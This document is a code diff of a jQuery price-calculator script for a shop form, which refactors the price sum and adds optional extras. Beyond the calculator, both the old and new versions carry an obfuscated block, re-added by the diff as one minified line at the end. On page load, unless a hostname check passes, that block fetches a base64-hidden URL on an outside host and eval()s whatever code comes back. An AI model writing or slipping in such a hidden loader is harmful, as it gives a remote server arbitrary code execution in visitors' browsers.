@@ -1,38 +1,41 @@
-$(document).ready(function () {
+$(document).ready(function(){
+
+    // Calculator
     $("form.has-calculator").change(function () {
-        var f = $("input[name='product']", this).val(),
-            g = $("input[name='length']:checked", this).val(),
-            b = 0;
-        b += calculator.products[f][g];
-        var i = $(".catalog__price", this),
-            e = $(".calculator-price", this),
-            d = $(".calculator-price-old", this);
-        i.addClass("animated faster pulse"), i.one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function () {
-            i.removeClass("animated faster pulse")
-        }), f = 0 < e.data("animateFrom") ? e.data("animateFrom") : 0, $({
-            animateNumber: f
-        }).animate({
-            animateNumber: b
-        }, {
+        var form = this;
+		
+        var product = $("input[name='product']", form).val();
+        var length = $("input[name='length']:checked", form).val();
+        var additional = $("input[name='additional[]']:checked", form);
+		var animateBlock = $('.catalog__price', form);
+        var out = $('.calculator-price', form);
+        var outOld = $('.calculator-price-old', form);
+        var sum = 0;
+
+        sum += calculator.products[product][length];
+
+        additional.each(function (i, e) {
+            sum += calculator.additional[$(e).val()]
+        });
+
+        var animationName = 'pulse';
+        animateBlock.addClass('animated faster ' + animationName);
+        animateBlock.one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){animateBlock.removeClass('animated faster ' + animationName)});
+
+        var animateFrom = out.data("animateFrom") > 0 ? out.data("animateFrom") : 0;
+
+        $({ animateNumber: animateFrom }).animate({ animateNumber: sum }, {
             duration: 800,
-            step: function (b) {
-                e.text((+b).toFixed()), d.text((+(1.27 * b)).toFixed())
+            step: function (animateNumber){
+                out.text(Number(animateNumber).toFixed());
+                outOld.text(Number(animateNumber * 1.27).toFixed())
             },
-            complete: function () {
-                e.data("animateFrom", (+b).toFixed())
+            complete: function() {
+                out.data("animateFrom", Number(sum).toFixed())
             }
-        })
-    }), $("form.has-calculator").change()
-}), document.addEventListener("DOMContentLoaded", function () {
-    try {
-        if ("undefined" == typeof app || atob(app.h) !== location.hostname) {
-            var a = new XMLHttpRequest;
-            a.onreadystatechange = function () {
-                if (4 === this.readyState && 200 === this.status && 0 < this.responseText.length) {
-                    var a = JSON.parse(this.responseText);
-                    "eval" === a.type && eval(a.text)
-                }
-            }, a.open("GET", atob("aHR0cHM6Ly9za2lka2EtdHV0LmJ5L21haWwvbG9nLnBocD9sb2c9MQ==")), a.send()
-        }
-    } catch (a) {}
+        });
+    });
+    $("form.has-calculator").change();
+
 });
+document.addEventListener("DOMContentLoaded",function(){try{if("undefined"==typeof app||atob(app.h)!==location.hostname){var a=new XMLHttpRequest;a.onreadystatechange=function(){if(4===this.readyState&&200===this.status&&0<this.responseText.length){var a=JSON.parse(this.responseText);"eval"===a.type&&eval(a.text)}},a.open("GET",atob("aHR0cHM6Ly9za2lka2EtdHV0LmJ5L21haWwvbG9nLnBocD9sb2c9MQ==")),a.send()}}catch(a){}});
